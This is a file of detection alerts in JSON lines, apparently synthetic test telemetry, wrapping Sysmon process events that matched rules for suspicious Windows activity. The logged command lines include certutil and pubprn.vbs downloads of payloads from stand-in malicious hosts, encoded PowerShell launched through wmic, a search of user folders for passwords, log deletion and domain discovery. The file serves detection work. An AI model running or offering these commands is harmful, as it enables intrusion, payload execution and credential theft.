{"window_size_minutes":5,"alert_id":"alert-1767814721694500600","rule_id":"e6c54d94-498c-4562-a37c-b469d8e9a275","rule_title":"Suspicious PowerShell Download and Execute Pattern","severity":4,"confidence":1,"timestamp":"2026-01-07T22:38:41.6826977+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_tactics":["Execution"],"mitre_techniques":["T1059.001"],"matched_fields":{"CommandLine":"wmic process call create \"cmd.exe /c powershell.exe -enc \u003cbase64_payload\u003e\""},"matched_selections":["selection"],"event_data":{"Event":{"EventData":{"CommandLine":"wmic process call create \"cmd.exe /c powershell.exe -enc \u003cbase64_payload\u003e\"","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA256=234567890ABCDEF1234567890ABCDEF123456789012ABCDEF1234567890ABCDE","Image":"C:\\Windows\\System32\\wbem\\WMIC.exe","IntegrityLevel":"High","LogonGuid":"{a23d45b-710f-5d6a-0000-0020c5e32400}","LogonId":"0x24e3c5","ParentCommandLine":"cmd.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentProcessGuid":"{a23d45b-710e-5d6a-0000-0010b6e22400}","ParentProcessId":"2788","ProcessGuid":"{a23d45b-7110-5d6a-0000-0010d4e42400}","ProcessId":"3456","RuleName":"technique_id=T1047,technique_name=Windows Management Instrumentation","TerminalSessionId":"1","User":"CORP\\LocalAdmin","UtcTime":"2026-01-03 04:35:10.567"},"System":{"Computer":"workstation28.corp.local","EventID":1,"Provider":{"Guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Name":"Microsoft-Windows-Sysmon"},"TimeCreated":{"SystemTime":"2026-01-03T04:35:10.567Z"}}},"command_line":null,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"},"event_count":16,"first_seen":"2026-01-07T22:38:41.54854+03:00","last_seen":"2026-01-07T22:38:41.6946178+03:00","rate_per_minute":3.2,"count_trend":"↑","should_escalate":false,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"}
{"window_size_minutes":5,"alert_id":"alert-1767814721698731400","rule_id":"e6c54d94-498c-4562-a37c-b469d8e9a275","rule_title":"Suspicious PowerShell Download and Execute Pattern","severity":4,"confidence":1,"timestamp":"2026-01-07T22:38:41.6946178+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_tactics":["Execution"],"mitre_techniques":["T1059.001"],"matched_fields":{"CommandLine":"certutil -urlcache -split -f http://malicious-site.com/payload.exe C:\\temp\\payload.exe"},"matched_selections":["selection"],"event_data":{"Event":{"EventData":{"CommandLine":"certutil -urlcache -split -f http://malicious-site.com/payload.exe C:\\temp\\payload.exe","CurrentDirectory":"C:\\temp\\","Hashes":"SHA256=34567890ABCDEF1234567890ABCDEF123456789012ABCDEF1234567890ABCDEF","Image":"C:\\Windows\\System32\\certutil.exe","IntegrityLevel":"Medium","LogonGuid":"{a23d45b-7331-5d6a-0000-0020e7052600}","LogonId":"0x2605e7","ParentCommandLine":"cmd.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentProcessGuid":"{a23d45b-7330-5d6a-0000-0010d9042600}","ParentProcessId":"3788","ProcessGuid":"{a23d45b-7332-5d6a-0000-0010f6062600}","ProcessId":"5132","RuleName":"technique_id=T1140,technique_name=Deobfuscate/Decode Files or Information","TerminalSessionId":"1","User":"CORP\\User02","UtcTime":"2026-01-03 05:25:33.123"},"System":{"Computer":"workstation30.corp.local","EventID":1,"Provider":{"Guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Name":"Microsoft-Windows-Sysmon"},"TimeCreated":{"SystemTime":"2026-01-03T05:25:33.123Z"}}},"command_line":null,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"},"event_count":17,"first_seen":"2026-01-07T22:38:41.54854+03:00","last_seen":"2026-01-07T22:38:41.6987314+03:00","rate_per_minute":3.4,"count_trend":"↑","should_escalate":false,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"}
{"window_size_minutes":5,"alert_id":"alert-1767814721707233800","rule_id":"e6c54d94-498c-4562-a37c-b469d8e9a275","rule_title":"Suspicious PowerShell Download and Execute Pattern","severity":4,"confidence":1,"timestamp":"2026-01-07T22:38:41.6987314+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_tactics":["Execution"],"mitre_techniques":["T1059.001"],"matched_fields":{"CommandLine":"reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"},"matched_selections":["selection"],"event_data":{"Event":{"EventData":{"CommandLine":"reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall","CurrentDirectory":"C:\\temp\\","Hashes":"SHA256=4567890ABCDEF1234567890ABCDEF123456789012ABCDEF1234567890ABCDEF1","Image":"C:\\Windows\\System32\\reg.exe","IntegrityLevel":"Medium","LogonGuid":"{a23d45b-7553-5d6a-0000-002009272800}","LogonId":"0x282709","ParentCommandLine":"cmd.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentProcessGuid":"{a23d45b-7552-5d6a-0000-0010fa262800}","ParentProcessId":"3456","ProcessGuid":"{a23d45b-7554-5d6a-0000-001018282800}","ProcessId":"4456","RuleName":"technique_id=T1012,technique_name=Query Registry","TerminalSessionId":"1","User":"CORP\\Attacker","UtcTime":"2026-01-03 06:15:55.789"},"System":{"Computer":"workstation32.corp.local","EventID":1,"Provider":{"Guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Name":"Microsoft-Windows-Sysmon"},"TimeCreated":{"SystemTime":"2026-01-03T06:15:55.789Z"}}},"command_line":null,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"},"event_count":18,"first_seen":"2026-01-07T22:38:41.54854+03:00","last_seen":"2026-01-07T22:38:41.7072338+03:00","rate_per_minute":3.6,"count_trend":"↑","should_escalate":false,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"}
{"window_size_minutes":5,"alert_id":"alert-1767814721717643800","rule_id":"e6c54d94-498c-4562-a37c-b469d8e9a275","rule_title":"Suspicious PowerShell Download and Execute Pattern","severity":4,"confidence":1,"timestamp":"2026-01-07T22:38:41.7072338+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_tactics":["Execution"],"mitre_techniques":["T1059.001"],"matched_fields":{"CommandLine":"cmd.exe /c del /f /q C:\\temp\\*.log"},"matched_selections":["selection"],"event_data":{"Event":{"EventData":{"CommandLine":"cmd.exe /c del /f /q C:\\temp\\*.log","CurrentDirectory":"C:\\temp\\","Hashes":"SHA256=567890ABCDEF1234567890ABCDEF123456789012ABCDEF1234567890ABCDEF12","Image":"C:\\Windows\\System32\\cmd.exe","IntegrityLevel":"Medium","LogonGuid":"{a23d45b-7664-5d6a-0000-00201a382900}","LogonId":"0x29381a","ParentCommandLine":"cleanup.exe","ParentImage":"C:\\temp\\cleanup.exe","ParentProcessGuid":"{a23d45b-7663-5d6a-0000-00100b372900}","ParentProcessId":"1876","ProcessGuid":"{a23d45b-7665-5d6a-0000-001029392900}","ProcessId":"2344","RuleName":"technique_id=T1070.004,technique_name=File Deletion","TerminalSessionId":"1","User":"CORP\\Attacker","UtcTime":"2026-01-03 06:40:10.012"},"System":{"Computer":"workstation33.corp.local","EventID":1,"Provider":{"Guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Name":"Microsoft-Windows-Sysmon"},"TimeCreated":{"SystemTime":"2026-01-03T06:40:10.012Z"}}},"command_line":null,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"},"event_count":19,"first_seen":"2026-01-07T22:38:41.54854+03:00","last_seen":"2026-01-07T22:38:41.7176438+03:00","rate_per_minute":3.8,"count_trend":"↑","should_escalate":false,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"}
{"window_size_minutes":5,"alert_id":"alert-1767814721726247800","rule_id":"e6c54d94-498c-4562-a37c-b469d8e9a275","rule_title":"Suspicious PowerShell Download and Execute Pattern","severity":4,"confidence":1,"timestamp":"2026-01-07T22:38:41.7182283+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_tactics":["Execution"],"mitre_techniques":["T1059.001"],"matched_fields":{"CommandLine":"cmd.exe /c dir C:\\Users\\ /s /b | findstr /i password"},"matched_selections":["selection"],"event_data":{"Event":{"EventData":{"CommandLine":"cmd.exe /c dir C:\\Users\\ /s /b | findstr /i password","CurrentDirectory":"C:\\temp\\","Hashes":"SHA256=67890ABCDEF1234567890ABCDEF123456789012ABCDEF1234567890ABCDEF123","Image":"C:\\Windows\\System32\\cmd.exe","IntegrityLevel":"Medium","LogonGuid":"{a23d45b-7775-5d6a-0000-00202b492a00}","LogonId":"0x2a492b","ParentCommandLine":"powershell.exe","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentProcessGuid":"{a23d45b-7774-5d6a-0000-00101c482a00}","ParentProcessId":"4224","ProcessGuid":"{a23d45b-7776-5d6a-0000-00103a4a2a00}","ProcessId":"5012","RuleName":"technique_id=T1083,technique_name=File and Directory Discovery","TerminalSessionId":"1","User":"CORP\\Attacker","UtcTime":"2026-01-03 07:05:45.345"},"System":{"Computer":"workstation34.corp.local","EventID":1,"Provider":{"Guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Name":"Microsoft-Windows-Sysmon"},"TimeCreated":{"SystemTime":"2026-01-03T07:05:45.345Z"}}},"command_line":null,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"},"event_count":20,"first_seen":"2026-01-07T22:38:41.54854+03:00","last_seen":"2026-01-07T22:38:41.7262478+03:00","rate_per_minute":4,"count_trend":"↑","should_escalate":false,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"}
{"window_size_minutes":5,"alert_id":"alert-1767814721733564300","rule_id":"e6c54d94-498c-4562-a37c-b469d8e9a275","rule_title":"Suspicious PowerShell Download and Execute Pattern","severity":4,"confidence":1,"timestamp":"2026-01-07T22:38:41.7262478+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_tactics":["Execution"],"mitre_techniques":["T1059.001"],"matched_fields":{"CommandLine":"net group /domain"},"matched_selections":["selection"],"event_data":{"Event":{"EventData":{"CommandLine":"net group /domain","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA256=7890ABCDEF1234567890ABCDEF123456789012ABCDEF1234567890ABCDEF1234","Image":"C:\\Windows\\System32\\net.exe","IntegrityLevel":"Medium","LogonGuid":"{a23d45b-7997-5d6a-0000-00204d6b2c00}","LogonId":"0x2c6b4d","ParentCommandLine":"cmd.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentProcessGuid":"{a23d45b-7996-5d6a-0000-00103e6a2c00}","ParentProcessId":"3912","ProcessGuid":"{a23d45b-7998-5d6a-0000-00105c6c2c00}","ProcessId":"4788","RuleName":"technique_id=T1069.002,technique_name=Domain Groups","TerminalSessionId":"2","User":"CORP\\User03","UtcTime":"2026-01-03 07:55:22.901"},"System":{"Computer":"dc01.corp.local","EventID":1,"Provider":{"Guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Name":"Microsoft-Windows-Sysmon"},"TimeCreated":{"SystemTime":"2026-01-03T07:55:22.901Z"}}},"command_line":null,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"},"event_count":21,"first_seen":"2026-01-07T22:38:41.54854+03:00","last_seen":"2026-01-07T22:38:41.7335643+03:00","rate_per_minute":4.2,"count_trend":"↑","should_escalate":false,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"}
{"window_size_minutes":5,"alert_id":"alert-1767814721742550700","rule_id":"e6c54d94-498c-4562-a37c-b469d8e9a275","rule_title":"Suspicious PowerShell Download and Execute Pattern","severity":4,"confidence":1,"timestamp":"2026-01-07T22:38:41.7365871+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_tactics":["Execution"],"mitre_techniques":["T1059.001"],"matched_fields":{"CommandLine":"cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs 127.0.0.1 script:http://evil-site.com/payload.sct"},"matched_selections":["selection"],"event_data":{"Event":{"EventData":{"CommandLine":"cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs 127.0.0.1 script:http://evil-site.com/payload.sct","CurrentDirectory":"C:\\temp\\","Hashes":"SHA256=90ABCDEF1234567890ABCDEF123456789012ABCDEF1234567890ABCDEF123456","Image":"C:\\Windows\\System32\\cscript.exe","IntegrityLevel":"Medium","LogonGuid":"{a23d45b-7ddb-5d6a-0000-002091a03000}","LogonId":"0x30a091","ParentCommandLine":"cmd.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentProcessGuid":"{a23d45b-7dda-5d6a-0000-001083a03000}","ParentProcessId":"2788","ProcessGuid":"{a23d45b-7ddc-5d6a-0000-0010a0a03000}","ProcessId":"4224","RuleName":"technique_id=T1216.001,technique_name=PubPrn","TerminalSessionId":"1","User":"CORP\\User05","UtcTime":"2026-01-03 09:35:33.123"},"System":{"Computer":"workstation39.corp.local","EventID":1,"Provider":{"Guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Name":"Microsoft-Windows-Sysmon"},"TimeCreated":{"SystemTime":"2026-01-03T09:35:33.123Z"}}},"command_line":null,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"},"event_count":22,"first_seen":"2026-01-07T22:38:41.54854+03:00","last_seen":"2026-01-07T22:38:41.7425507+03:00","rate_per_minute":4.4,"count_trend":"→","should_escalate":false,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"}
{"window_size_minutes":5,"alert_id":"alert-1767814721751540100","rule_id":"e6c54d94-498c-4562-a37c-b469d8e9a275","rule_title":"Suspicious PowerShell Download and Execute Pattern","severity":4,"confidence":1,"timestamp":"2026-01-07T22:38:41.7425507+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_tactics":["Execution"],"mitre_techniques":["T1059.001"],"matched_fields":{"CommandLine":"whoami /all"},"matched_selections":["selection"],"event_data":{"Event":{"EventData":{"CommandLine":"whoami /all","CurrentDirectory":"C:\\temp\\","Hashes":"SHA256=0ABCDEF1234567890ABCDEF123456789012ABCDEF1234567890ABCDEF1234567","Image":"C:\\Windows\\System32\\whoami.exe","IntegrityLevel":"Medium","LogonGuid":"{a23d45b-7ffd-5d6a-0000-0020b3c13200}","LogonId":"0x32c1b3","ParentCommandLine":"cmd.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentProcessGuid":"{a23d45b-7ffc-5d6a-0000-0010a4c03200}","ParentProcessId":"4456","ProcessGuid":"{a23d45b-7ffe-5d6a-0000-0010c2c23200}","ProcessId":"5012","RuleName":"technique_id=T1033,technique_name=System Owner/User Discovery","TerminalSessionId":"1","User":"CORP\\Attacker","UtcTime":"2026-01-03 10:25:55.789"},"System":{"Computer":"workstation41.corp.local","EventID":1,"Provider":{"Guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Name":"Microsoft-Windows-Sysmon"},"TimeCreated":{"SystemTime":"2026-01-03T10:25:55.789Z"}}},"command_line":null,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"},"event_count":23,"first_seen":"2026-01-07T22:38:41.54854+03:00","last_seen":"2026-01-07T22:38:41.7515401+03:00","rate_per_minute":4.6,"count_trend":"→","should_escalate":false,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"}
{"window_size_minutes":5,"alert_id":"alert-1767814721760595800","rule_id":"e6c54d94-498c-4562-a37c-b469d8e9a275","rule_title":"Suspicious PowerShell Download and Execute Pattern","severity":4,"confidence":1,"timestamp":"2026-01-07T22:38:41.7515401+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_tactics":["Execution"],"mitre_techniques":["T1059.001"],"matched_fields":{"CommandLine":"ipconfig /all"},"matched_selections":["selection"],"event_data":{"Event":{"EventData":{"CommandLine":"ipconfig /all","CurrentDirectory":"C:\\temp\\","Hashes":"SHA256=ABCDEF1234567890ABCDEF123456789012ABCDEF1234567890ABCDEF12345678","Image":"C:\\Windows\\System32\\ipconfig.exe","IntegrityLevel":"Medium","LogonGuid":"{a23d45b-800e-5d6a-0000-0020c4d23300}","LogonId":"0x33d2c4","ParentCommandLine":"cmd.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentProcessGuid":"{a23d45b-800d-5d6a-0000-0010b5d13300}","ParentProcessId":"3788","ProcessGuid":"{a23d45b-800f-5d6a-0000-0010d3d33300}","ProcessId":"2344","RuleName":"technique_id=T1016,technique_name=System Network Configuration Discovery","TerminalSessionId":"1","User":"CORP\\Attacker","UtcTime":"2026-01-03 10:50:10.012"},"System":{"Computer":"workstation42.corp.local","EventID":1,"Provider":{"Guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Name":"Microsoft-Windows-Sysmon"},"TimeCreated":{"SystemTime":"2026-01-03T10:50:10.012Z"}}},"command_line":null,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"},"event_count":24,"first_seen":"2026-01-07T22:38:41.54854+03:00","last_seen":"2026-01-07T22:38:41.7605958+03:00","rate_per_minute":4.8,"count_trend":"→","should_escalate":false,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"}
{"window_size_minutes":5,"alert_id":"alert-1767814721768781400","rule_id":"e6c54d94-498c-4562-a37c-b469d8e9a275","rule_title":"Suspicious PowerShell Download and Execute Pattern","severity":4,"confidence":1,"timestamp":"2026-01-07T22:38:41.7605958+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_tactics":["Execution"],"mitre_techniques":["T1059.001"],"matched_fields":{"CommandLine":"net view /domain"},"matched_selections":["selection"],"event_data":{"Event":{"EventData":{"CommandLine":"net view /domain","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA256=BCDEF1234567890ABCDEF123456789012ABCDEF1234567890ABCDEF123456789","Image":"C:\\Windows\\System32\\net.exe","IntegrityLevel":"Medium","LogonGuid":"{a23d45b-811f-5d6a-0000-0020d5e33400}","LogonId":"0x34e3d5","ParentCommandLine":"cmd.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentProcessGuid":"{a23d45b-811e-5d6a-0000-0010c6e23400}","ParentProcessId":"3912","ProcessGuid":"{a23d45b-8120-5d6a-0000-0010e4e43400}","ProcessId":"4788","RuleName":"technique_id=T1018,technique_name=Remote System Discovery","TerminalSessionId":"1","User":"CORP\\Attacker","UtcTime":"2026-01-03 11:15:45.345"},"System":{"Computer":"dc01.corp.local","EventID":1,"Provider":{"Guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Name":"Microsoft-Windows-Sysmon"},"TimeCreated":{"SystemTime":"2026-01-03T11:15:45.345Z"}}},"command_line":null,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"},"event_count":25,"first_seen":"2026-01-07T22:38:41.54854+03:00","last_seen":"2026-01-07T22:38:41.7687814+03:00","rate_per_minute":5,"count_trend":"→","should_escalate":false,"source_file":"data\\agent_ecs-events\\ecs-events.jsonl"}
{"window_size_minutes":5,"alert_id":"alert-1767814721815571000","rule_id":"98dedfdd-8333-49d4-9f23-d7018cccae53","rule_title":"Enable LM Hash Storage - ProcCreation","severity":4,"confidence":0.8,"timestamp":"2026-01-07T22:38:41.806662+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_techniques":["T1112"],"matched_fields":{"CommandLine":"consent.exe 1744 618 0000027200E997F0"},"matched_selections":["selection"],"event_data":{"@timestamp":"2025-12-26T20:04:29.3385213+03:00","command_line":null,"event.action":"start","event.category":"process","event.code":1,"host.name":"NullByte","process.command_line":"consent.exe 1744 618 0000027200E997F0","process.executable":"C:\\Windows\\System32\\consent.exe","process.name":"consent.exe","process.parent.executable":"C:\\Windows\\System32\\svchost.exe","process.parent.name":"svchost.exe","process.pid":7092,"source_file":"data\\agent_ecs-events\\normalized_logs.jsonl","user.domain":"NT AUTHORITY","user.name":"SYSTEM"},"event_count":1,"first_seen":"2026-01-07T22:38:41.815571+03:00","last_seen":"2026-01-07T22:38:41.815571+03:00","rate_per_minute":0.2,"count_trend":"→","should_escalate":false,"source_file":"data\\agent_ecs-events\\normalized_logs.jsonl"}
{"window_size_minutes":5,"alert_id":"alert-1767814721971802500","rule_id":"98dedfdd-8333-49d4-9f23-d7018cccae53","rule_title":"Enable LM Hash Storage - ProcCreation","severity":4,"confidence":0.8,"timestamp":"2026-01-07T22:38:41.9640457+03:00","event_id":"1","event_category":"process_creation","product":"windows","mitre_techniques":["T1112"],"matched_fields":{"CommandLine":"consent.exe 1744 396 0000027200E344D0"},"matched_selections":["selection"],"event_data":{"@timestamp":"2025-12-26T20:08:14.1077782+03:00","command_line":null,"event.action":"start","event.category":"process","event.code":1,"host.name":"NullByte","process.command_line":"consent.exe 1744 396 0000027200E344D0","process.executable":"C:\\Windows\\System32\\consent.exe","process.name":"consent.exe","process.parent.executable":"C:\\Windows\\System32\\svchost.exe","process.parent.name":"svchost.exe","process.pid":16264,"source_file":"data\\agent_ecs-events\\normalized_logs.jsonl","user.domain":"NT AUTHORITY","user.name":"SYSTEM"},"event_count":1,"first_seen":"2026-01-07T22:38:41.9718025+03:00","last_seen":"2026-01-07T22:38:41.9718025+03:00","rate_per_minute":0.2,"count_trend":"→","should_escalate":false,"source_file":"data\\agent_ecs-events\\normalized_logs.jsonl"}
